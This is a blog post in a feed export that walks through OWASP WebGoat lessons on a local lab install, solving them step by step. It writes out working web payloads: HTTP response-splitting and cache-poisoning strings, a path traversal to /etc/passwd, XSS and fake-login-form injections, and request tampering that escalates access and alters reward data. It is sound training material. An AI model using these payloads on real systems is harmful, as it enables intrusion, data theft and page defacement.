<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2014-09-07T22:54:12+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - WebGoat]]></title>
    <link href="http://chousensha.github.io/blog/2014/08/15/pentest-lab-webgoat/"/>
    <updated>2014-08-15T23:17:44+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/08/15/pentest-lab-webgoat</id>
    <content type="html"><![CDATA[<p>The next target in my web penetration testing series will be WebGoat. So, what is WebGoat?</p>

<!-- more -->


<blockquote><p>WebGoat is a deliberately insecure web application maintained by OWASP designed to
teach web application security lessons. In each lesson, users must demonstrate their
understanding of a security issue by exploiting a real vulnerability in the WebGoat
applications. The application is a realistic teaching environment, providing users
with hints and code to further explain the lesson.</p></blockquote>

<p>I used the standard install that contains the Java Runtime Environment and Tomcat server, in addition to the web application itself. If you follow the installation instructions you should be fine, but in case you get a <em>Please set JAVA_HOME to a Java 1.6 JDK install</em> message, remember to point the environment variable to your Java JDK location. In my case, it looked like this: <code>export JAVA_HOME=/usr/lib/jvm/java-6-openjdk-amd64</code></p>

<p>Then navigate to <a href="http://localhost:8080/WebGoat/attack">http://localhost:8080/WebGoat/attack</a> (or whatever port you used to start it on). The credentials are <em>guest/guest</em>. You can see from the menu that there are many attack categories. So, let&rsquo;s begin!</p>

<h3>General</h3>

<p><strong>HTTP Basics</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/http_basics.png" title="http basics" alt="http basics"></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>This lesson presents the basics for understanding the transfer of data between the browser and the web application.</p>

<p><strong>How HTTP works:</strong></p>

<p>All HTTP transactions follow the same general format. Each client request and server response has three parts: the request or response line, a header section, and the entity body. The client initiates a transaction as follows:</p>

<p>The client contacts the server and sends a document request</p>

<p><em>GET /index.html?param=value HTTP/1.0</em></p>

<p>Next, the client sends optional header information to inform the server of its configuration and the document formats it will accept.</p>

<p><em>User-Agent: Mozilla/4.06 Accept: image/gif,image/jpeg, <em>/</em></em></p>

<p>After sending the request and headers, the client may send additional data. This data is mostly used by CGI programs using the POST method.</p>

<p><strong>My solution</strong></p>

<p>Well, nothing fancy here. Just enter something in the text box. This is just a warmup.</p>

<p><strong>HTTP Splitting</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/http_split.png" title="http splitting" alt="http splitting"></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>This lesson teaches how to perform HTTP Splitting attacks.</p>

<p><strong>How the attack works:</strong></p>

<p>The attacker passes malicious code to the web server together with normal input. A victim application will not be checking for CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n) characters. These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but they also allow them to create additional responses entirely under their control.</p>

<p>The effect of an HTTP Splitting attack is maximized when accompanied with a Cache Poisoning. The goal of Cache Poisoning attack is to poison the cache of the victim by fooling the cache into believing that the page hijacked using the HTTP splitting is an authentic version of the server&rsquo;s copy.</p>

<p>The attack works by using the HTTP Splitting attack plus adding the <strong>Last-Modified:</strong> header and setting it to a future date. This forces the browser to send an incorrect <strong>If-Modified-Since</strong> request header on future requests. Because of this, the server will always report that the (poisoned) page has not changed, and the victim&rsquo;s browser will continue to display the attacked version of the page.</p>

<p>A sample of a 304 response is:</p>

<p><em>HTTP/1.1 304 Not Modified</em>
<em>Date: Fri, 30 Dec 2005 17:32:47 GMT</em></p>

<p><strong>My solution</strong></p>

<p><a href="https://www.owasp.org/index.php/HTTP_Response_Splitting"><strong>Stage 1 attack</strong></a></p>

<blockquote><p>HTTP response splitting occurs when:</p>

<ul>
<li>Data enters a web application through an untrusted source, most frequently an HTTP request.</li>
<li>The data is included in an HTTP response header sent to a web user without being validated for malicious characters.</li>
</ul>


<p>HTTP response splitting is a means to an end, not an end in itself. At its root, the attack is straightforward: an attacker passes
malicious data to a vulnerable application, and the application includes the data in an HTTP response header.</p>

<p>To mount a successful exploit, the application must allow input that contains CR (carriage return, also given by %0d or \r) and LF
(line feed, also given by %0a or \n)characters into the header AND the underlying platform must be vulnerable to the injection of such
characters. These characters not only give attackers control of the remaining headers and body of the response the application intends
to send, but also allow them to create additional responses entirely under their control.</p></blockquote>

<p>I entered <code>en%0a</code> in the box and looked at the response headers, which look like this:</p>

<p>HTTP/1.1 302 Moved Temporarily<br/>
Server: Apache-Coyote/1.1<br/>
Location: <a href="http://localhost:8080/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=en%0a  ">http://localhost:8080/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=en%0a  </a>
Content-Type: text/html;charset=ISO-8859-1<br/>
Content-Length: 0<br/>
Date: Fri, 15 Aug 2014 22:01:57 GMT</p>

<p>There is no input sanitization. Note the <strong>Content-Length: 0</strong> header, which signals the end of the first request. After this header, I can add arbitrary headers. For stage 1, it looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Content-Length: 0
</span><span class='line'>
</span><span class='line'>HTTP/1.1 200 OK  
</span><span class='line'>Content-Type: text/html  
</span><span class='line'>Content-Length: 50  
</span><span class='line'>&lt;html&gt;&lt;body&gt;Stage 1 pwned!&lt;/body&gt;&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>Just typing the headers in the box won&rsquo;t work for the attack, you have to URL encode it. The encoded version is:</p>

<p><code>Content-Length%3A+0%0D%0A%0D%0AHTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%0D%0AContent-Length%3A+50%0D%0A%3Chtml%3E%3Cbody%3EStage+1+pwned%21%3C%2Fbody%3E%3C%2Fhtml%3E</code>.</p>

<p>That concludes the first part of the attack.</p>

<p><a href="https://www.owasp.org/index.php/Cache_Poisoning"><strong>Stage 2 overview</strong></a></p>

<blockquote><p>The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even
the browser cache of a single user. If a response is cached in a shared web cache, such as those commonly found in proxy servers, then
all users of that cache will continue to receive the malicious content until the cache entry is purged. Similarly, if the response is
cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is
purged, although only the user of the local browser instance will be affected.</p>

<p>To successfully carry out such an attack, an attacker:</p>

<ul>
<li>Finds the vulnerable service code, which allows them to fill the HTTP header field with many headers.</li>
<li>Forces the cache server to flush its actual cache content, which we want to be cached by the servers.</li>
<li>Sends a specially crafted request, which will be stored in cache.</li>
<li>Sends the next request. The previously injected content stored in cache will be the response to this request.</li>
</ul>


<p>A Cache Poisoning attack is possible because of HTTP Response Splitting and flaws in the web application. It is crucial from the
attacker&rsquo;s point of view that the application allows for filling the header field with more than one header using CR (Carrige Return)
and LF (Line Feed) characters.</p></blockquote>

<p>For the next part, we have to modify the <strong>Last-Modified</strong> header and setting it to a date in the future, to force the browser to cache the malicious page.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Content-Length: 0
</span><span class='line'>
</span><span class='line'>HTTP/1.1 200 OK  
</span><span class='line'>Content-Type: text/html  
</span><span class='line'>Last-Modified: Mon, 01 Aug 3000 00:00:00 GMT  
</span><span class='line'>Content-Length: 50  
</span><span class='line'>&lt;html&gt;&lt;body&gt;Stage 1 pwned!&lt;/body&gt;&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>Again, URL encode it:</p>

<p><code>Content-Length%3A+0%0D%0A%0D%0AHTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%0D%0ALast-Modified%3A+Mon%2C+01+Aug+3000+00%3A00%3A00+GMT%0D%0AContent-Length%3A+50%0D%0A%3Chtml%3E%3Cbody%3EStage+1+pwned%21%3C%2Fbody%3E%3C%2Fhtml%3E</code></p>

<p>And stage 2 is complete!</p>

<h3>Access Control Flaws</h3>

<p><strong>Using an Access Control Matrix</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/ac_matrix.png" title="access control matrix" alt="access control matrix"></p>

<p> User Larry [User, Manager] was allowed to access resource Account Manager</p>

<p><strong>Bypass a Path Based Access Control Scheme</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/bypass_ac.png" title="bypass ac" alt="bypass ac"></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>In a path based access control scheme, an attacker can traverse a path by providing relative path information. Therefore an attacker can use relative paths to access files that normally are not directly accessible by anyone, or would otherwise be denied if requested directly.</p>

<p><strong>My solution</strong></p>

<p>Choose a file from the list and intercept the request. Then modify it to access a different file. I changed <code>File=FailOpenAuthentication.html&amp;SUBMIT=View+File</code> to <code>File=../../../../../../../../../etc/passwd&amp;SUBMIT=View+File</code></p>

<p><strong>LAB: Role Based Access Control</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/rbac_stage1.png" title="bypass rbac" alt="bypass rbac"></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>In role-based access control scheme, a role represents a set of access permissions and privileges. A user can be assigned one or more roles. A role-based access control normally consists of two parts: role permission management and role assignment. A broken role-based access control scheme might allow a user to perform accesses that are not allowed by his/her assigned roles, or somehow obtain unauthorized roles.</p>

<p><strong>General Goal(s):</strong></p>

<p>Your goal is to explore the access control rules that govern this site. Each role has permission to certain resources (A-F). Each user is assigned one or more roles. Only the user with the [Admin] role should have access to the &lsquo;F&rsquo; resources. In a successful attack, a who user doesn&rsquo;t have the [Admin] role can access resource F.</p>

<p><strong>Stage 1 Bypass Business Layer Access Control.</strong></p>

<p>I logged in as Tom and looked at the request headers when choosing the action ViewProfile. It looks like this: <code>employee_id=105&amp;action=ViewProfile</code>. So, how might a delete profile action look like? I replayed the request with this very creative modification: <code>employee_id=105&amp;action=DeleteProfile</code>. And that&rsquo;s it for Stage 1!</p>

<p><strong>Stage 2: Add Business Layer Access Control.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to deny unauthorized access to the Delete function. To do this, you will have to alter the WebGoat code. Once you have done this, repeat stage 1 and verify that access to DeleteProfile functionality is properly denied.</p>

<p>I will skip the exercises that require the developer version, since I&rsquo;m using the standard version.</p>

<p><strong>Stage 3: Bypass Data Layer Access Control</strong></p>

<p>As regular employee &lsquo;Tom&rsquo;, exploit weak access control to View another employee&rsquo;s profile. Verify the access.</p>

<p>This time, modify the <em>employee_id</em> field to view a different profile: <code>employee_id=111&amp;action=ViewProfile</code></p>

<p><strong>Stage 4: Add Data Layer Access Control</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to deny unauthorized access to this data. Once you have done this, repeat stage 3, and verify that access to other employee&rsquo;s profiles is properly denied.</p>

<p><strong>Remote Admin Access</strong></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>Applications will often have an administrative interface that allows privileged users access to functionality that normal users shouldn&rsquo;t see. The application server will often have an admin interface as well.</p>

<p><strong>General Goal(s):</strong></p>

<p>Try to access the administrative interface for WebGoat. You may also try to access the administrative interface for Tomcat. The Tomcat admin interface can be accessed via a URL (/admin) and will not count towards the completion of this lesson.</p>

<p>If you look at Admin Functions in the menu, you should only see the Report Card function. Append <code>&amp;admin=true</code> to the URL, and you will see more functions.</p>

<h3>AJAX Security</h3>

<p><strong>Same Origin Policy Protection</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/sop.png" title="same origin policy" alt="same origin policy"></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>A key element of AJAX is the XMLHttpRequest (XHR), which allows javascript to make asynchronous calls from the client side to a server. However, as a security measure these requests may only be made to the server from which the client page originated.</p>

<p>Try the requests for both the same origin and different origin.</p>

<p><strong>LAB: DOM-Based cross-site scripting</strong></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>The Document Object Model (DOM) presents an interesting problem from a security standpoint. It allows the content of a web page to be dynamically modified, but that can be abused by attackers during a malicious code injection. XSS, a type of malicious code injection, can occur when unvalidated user input is used directly to modify the content of a page on the client side.</p>

<p><strong>General Goal(s):</strong></p>

<p>For this exercise, your mission is to use this vulnerability to inject malicious code into the DOM. Then in the last stage, you will correct the flaws in the code to address the vulnerability.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/img_deface.png" title="dom xss stage 1" alt="dom xss stage 1"></p>

<p>The image location is at <a href="http://localhost:8080/WebGoat/images/logos/owasp.jpg.">http://localhost:8080/WebGoat/images/logos/owasp.jpg.</a> To deface the page, the injection looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;images/logos/owasp.jpg&quot;</span><span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>You will notice the Hello message, followed by the OWASP image.</p>

<p><strong>STAGE 2</strong></p>

<p> Now, try to create a JavaScript alert using the image tag</p>

<p>For this attack, we have to use the <em>onerror</em> event, which is triggered if an error occurs when loading an image. And of course, make sure there is no valid image so the error can happen:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;no img&quot;</span> <span class="na">onerror=</span><span class="s">&quot;alert(&#39;There is no image, just XSS&#39;)&quot;</span><span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>STAGE 3</strong></p>

<p>Next, try to create a JavaScript alert using the IFRAME tag.</p>

<p>The <em>iframe</em> tag specifies an inline frame, which is used to embed another document within the current HTML document. The attack looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">&quot;javascript:alert(&#39;You&#39;ve been framed!&#39;);&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>STAGE 4</strong></p>

<p>Use the following to create a fake login form:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Please enter your password:&lt;BR&gt;&lt;input type = "password" name="pass"/&gt;&lt;button onClick="javascript:alert('I have your password: ' + pass.value);"&gt;Submit&lt;/button&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;</span></code></pre></td></tr></table></div></figure>


<p>Now enter something in the box, and you will see it alerted back.</p>

<p><strong>STAGE 5</strong></p>

<p>Perform client-side HTML entity encoding to mitigate the DOM XSS vulnerability. A utility method is provided for you in escape.js.</p>

<p>Look in the page source for escape.js. Inside you will find the following function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">function</span> <span class="nx">escapeHTML</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="kd">var</span> <span class="nx">div</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
</span><span class='line'>   <span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createTextNode</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
</span><span class='line'>   <span class="nx">div</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
</span><span class='line'>   <span class="k">return</span> <span class="nx">div</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>In Firebug, look at DOMXSS.js. We have to modify this function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">function</span> <span class="nx">displayGreeting</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
</span><span class='line'>      <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;greeting&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s2">&quot;Hello, &quot;</span> <span class="o">+</span> <span class="nx">name</span><span class="o">+</span> <span class="s2">&quot;!&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>to use the escapeHTML function on the name parameter:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;greeting&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s2">&quot;Hello, &quot;</span> <span class="o">+</span> <span class="nx">escapeHTML</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span><span class="o">+</span> <span class="s2">&quot;!&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>To make the modification, I edited the Javascript file, located in my WebGoat directory, at <code>tomcat/webapps/WebGoat/javascript</code></p>

<p><strong>LAB: Client Side Filtering</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to send to the client only information which they are supposed to have access to. In this lesson, too much information is being sent to the client, creating a serious access control problem.</p>

<p><strong>General Goal(s):</strong>
For this exercise, your mission is exploit the extraneous information being returned by the server to discover information to which you should not have access.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/client_filter.png" title="client side filtering" alt="client side filtering"></p>

<p>Inspect the source with Firebug, and you will notice a hidden table called <em>hiddenEmployeeRecords</em>. Look at the last id (112), and you will find out Bartholomew&rsquo;s salary is 450000.</p>

<p><strong>STAGE 2:</strong></p>

<p>Now, fix the problem. Modify the server to only return results that Moe Stooge is allowed to see.</p>

<p>Again, this will require the modification of a file. Look in <code>tomcat/webapps/WebGoat/lessons/Ajax</code>. In the <em>employees.xml</em> file, every employee has a <em>Managers</em> property, that shows which manager should have access over that employee&rsquo;s records. Looking at Neville Bartholomew&rsquo;s profile, we see only he can access his information:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;Employee&gt;</span>
</span><span class='line'>        <span class="nt">&lt;UserID&gt;</span>112<span class="nt">&lt;/UserID&gt;</span>
</span><span class='line'>        <span class="nt">&lt;FirstName&gt;</span>Neville<span class="nt">&lt;/FirstName&gt;</span>
</span><span class='line'>        <span class="nt">&lt;LastName&gt;</span>Bartholomew<span class="nt">&lt;/LastName&gt;</span>
</span><span class='line'>        <span class="nt">&lt;Street&gt;</span>1 Corporate Headquarters<span class="nt">&lt;/Street&gt;</span>
</span><span class='line'>        <span class="nt">&lt;CS&gt;</span>San Jose, CA<span class="nt">&lt;/CS&gt;</span>
</span><span class='line'>        <span class="nt">&lt;Phone&gt;</span>408-587-0024<span class="nt">&lt;/Phone&gt;</span>
</span><span class='line'>        <span class="nt">&lt;StartDate&gt;</span>3012000<span class="nt">&lt;/StartDate&gt;</span>
</span><span class='line'>        <span class="nt">&lt;SSN&gt;</span>111-111-1111<span class="nt">&lt;/SSN&gt;</span>
</span><span class='line'>        <span class="nt">&lt;Salary&gt;</span>450000<span class="nt">&lt;/Salary&gt;</span>
</span><span class='line'>        <span class="nt">&lt;CreditCard&gt;</span>4803389267684109<span class="nt">&lt;/CreditCard&gt;</span>
</span><span class='line'>        <span class="nt">&lt;Limit&gt;</span>300<span class="nt">&lt;/Limit&gt;</span>
</span><span class='line'>        <span class="nt">&lt;Comments&gt;&lt;/Comments&gt;</span>
</span><span class='line'>        <span class="nt">&lt;DisciplinaryExplanation&gt;&lt;/DisciplinaryExplanation&gt;</span>
</span><span class='line'>        <span class="nt">&lt;DisciplinaryDate&gt;</span>112005<span class="nt">&lt;/DisciplinaryDate&gt;</span>
</span><span class='line'>        <span class="nt">&lt;Managers&gt;</span>
</span><span class='line'>      <span class="nt">&lt;Manager&gt;</span>112<span class="nt">&lt;/Manager&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/Managers&gt;</span>
</span><span class='line'><span class="nt">&lt;/Employee&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next, look at <em>clientSideFiltering.jsp</em>. I am not proficient with XPath, but here is the relevant bit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>StringBuffer sb = new StringBuffer();
</span><span class='line'>  
</span><span class='line'>sb.append(&quot;/Employees/Employee/UserID | &quot;);
</span><span class='line'>sb.append(&quot;/Employees/Employee/FirstName | &quot;);
</span><span class='line'>sb.append(&quot;/Employees/Employee/LastName | &quot;);
</span><span class='line'>sb.append(&quot;/Employees/Employee/SSN | &quot;);
</span><span class='line'>sb.append(&quot;/Employees/Employee/Salary &quot;);
</span><span class='line'>  
</span><span class='line'>String expression = sb.toString();
</span></code></pre></td></tr></table></div></figure>


<p>We have to change it so the information returned corresponds with the access rights that only managers should have over specific employee records. The filter looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>sb.append(&quot;/Employees/Employee[Managers/Manager/text() = &quot; + userId + &quot;]/UserID | &quot;);
</span><span class='line'>sb.append(&quot;/Employees/Employee[Managers/Manager/text() = &quot; + userId + &quot;]/FirstName | &quot;);
</span><span class='line'>sb.append(&quot;/Employees/Employee[Managers/Manager/text() = &quot; + userId + &quot;]/LastName | &quot;);
</span><span class='line'>sb.append(&quot;/Employees/Employee[Managers/Manager/text() = &quot; + userId + &quot;]/SSN | &quot;);
</span><span class='line'>sb.append(&quot;/Employees/Employee[Managers/Manager/text() = &quot; + userId + &quot;]/Salary &quot;);
</span></code></pre></td></tr></table></div></figure>


<p>If I understand it right, this filter ensures that information is returned only if the user id is present in the Manager node. For example, in Bartholomew&rsquo;s case, it should enforce the fact that only user id 112 can access his records. In other words, only Bartholomew himself can view his information.</p>

<p>For this, I looked at the solution provided by WebGoat, while searching some more about XPath syntax.</p>

<p><strong>DOM Injection</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
How to perform DOM injection attacks.</p>

<p><strong>How the attack works:</strong>
Some applications, especially the ones that use AJAX, manipulate and update the DOM directly using javascript, DHTML and eval() methods.
An attacker may take advantage of that by intercepting the reply and trying to inject some javascript commands to exploit the vulnerabilities.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/dom_injection.png" title="dom injection" alt="dom injection"></p>

<p>In Firebug, I just changed the Activate button below:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;SUBMIT&quot;</span> <span class="na">type=</span><span class="s">&quot;SUBMIT&quot;</span> <span class="na">name=</span><span class="s">&quot;SUBMIT&quot;</span> <span class="na">value=</span><span class="s">&quot;Activate!&quot;</span> <span class="na">disabled=</span><span class="s">&quot;&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>to &ldquo;enabled&rdquo;, then clicked it.</p>

<p><strong>XML Injection</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform XML Injection attacks.</p>

<p><strong>How the attack works:</strong>
AJAX applications use XML to exchange information with the server. This XML can be easily intercepted and altered by a malicious attacker.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/xml_injection.png" title="xml injection" alt="xml injection"></p>

<p>When you enter your account id, you will see the rewards that you can claim:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Your account balance is now 100 points
</span><span class='line'>
</span><span class='line'>Rewards
</span><span class='line'>
</span><span class='line'>WebGoat Mug 20 Pts
</span><span class='line'>WebGoat t-shirt 50 Pts
</span><span class='line'>WebGoat Secure Kettle 30 Pts</span></code></pre></td></tr></table></div></figure>


<p>This exercise requires a proxy, so I will use WebScarab to capture the requests and responses. The response from the server contains the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;root&gt;</span>
</span><span class='line'><span class="nt">&lt;reward&gt;</span>WebGoat Mug 20 Pts<span class="nt">&lt;/reward&gt;</span>
</span><span class='line'><span class="nt">&lt;reward&gt;</span>WebGoat t-shirt 50 Pts<span class="nt">&lt;/reward&gt;</span>
</span><span class='line'><span class="nt">&lt;reward&gt;</span>WebGoat Secure Kettle 30 Pts<span class="nt">&lt;/reward&gt;</span>
</span><span class='line'><span class="nt">&lt;/root&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This means it&rsquo;s only a matter of adding the other rewards to the response, so it becomes this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;root&gt;</span>
</span><span class='line'><span class="nt">&lt;reward&gt;</span>WebGoat t-shirt 20 Pts<span class="nt">&lt;/reward&gt;</span>
</span><span class='line'><span class="nt">&lt;reward&gt;</span>WebGoat Secure Kettle 50 Pts<span class="nt">&lt;/reward&gt;</span>
</span><span class='line'><span class="nt">&lt;reward&gt;</span>WebGoat Mug 30 Pts<span class="nt">&lt;/reward&gt;</span>
</span><span class='line'><span class="nt">&lt;reward&gt;</span>WebGoat Core Duo Laptop 2000 Pts<span class="nt">&lt;/reward&gt;</span>
</span><span class='line'><span class="nt">&lt;reward&gt;</span>WebGoat Hawaii Cruise 3000 Pts<span class="nt">&lt;/reward&gt;</span>
</span><span class='line'><span class="nt">&lt;/root&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Do that in WebScarab a couple of times and you will see them available on the page. I took the laptop!</p>

